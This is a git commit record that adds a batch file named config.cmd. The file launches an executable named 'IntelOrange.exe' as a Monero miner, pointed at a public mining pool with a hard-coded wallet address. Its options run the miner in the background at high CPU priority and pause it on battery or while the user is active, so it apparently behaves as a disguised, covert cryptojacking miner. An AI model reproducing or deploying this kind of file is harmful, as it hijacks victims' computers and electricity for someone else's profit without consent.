652e3984bcf44dece733bd56b9cd3307906be730
txh22cc <seaduck@duck.com>
2024-10-24 20:26:48 +0200

    9r4ng3.1.0.0

---
+++ config.cmd
@@ -0,0 +1,3 @@
+cd /d "%~dp0"
+IntelOrange.exe -o de.monero.herominers.com:1111 -a rx/0 -u 476vQTxSfpWSQAt7ThAHKrAkxeNRBME6VEqHRHHr6UD46vdPeA6gL6V1Dmck63SXtW7VfJtzHn2wHDwy2GfuU9tpRWX4j21 --donate-level=0 --cpu-priority=4 --background --pause-on-battery --pause-on-active=15
+exit
